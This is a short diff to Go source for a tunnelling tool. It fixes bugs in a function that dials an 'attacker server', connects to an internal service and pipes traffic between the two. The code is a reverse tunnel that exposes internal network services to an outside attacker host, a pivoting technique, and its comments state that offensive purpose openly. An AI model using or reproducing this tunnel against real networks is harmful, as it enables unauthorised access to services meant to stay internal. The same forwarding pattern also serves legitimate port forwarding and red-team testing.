@@ -16,25 +16,27 @@ type Tunnling struct {
 }
 
 func BiForwarding(src, dst net.Conn) {
-	go io.Copy(src, dst) // Client -> Service
-	go io.Copy(dst, src) // Service -> Client
+	go io.Copy(src, dst) // dst → src (responses)
+	io.Copy(dst, src)    // src → dst (requests)
 }
 
 // This work for client
 func ClientInternal(service string, targetAddr string) {
-
-	// connecting to the attackers server
 	attacker, err := net.Dial("tcp", targetAddr)
 	if err != nil {
-		log.Println("Failed to connect to local target:", err)
+		log.Println("Failed to connect to attacker server:", err)
 		return
 	}
-
-	internalService, err := net.Dial("tcp", service)
-
 	defer attacker.Close()
 
-	go BiForwarding(internalService, attacker)
+	internalService, err := net.Dial("tcp", service)
+	if err != nil {
+		log.Println("Failed to connect to internal service:", err)
+		return
+	}
+	defer internalService.Close()
+
+	BiForwarding(attacker, internalService)
 }
 
 func bindLocal(localBind string, client net.Conn) {
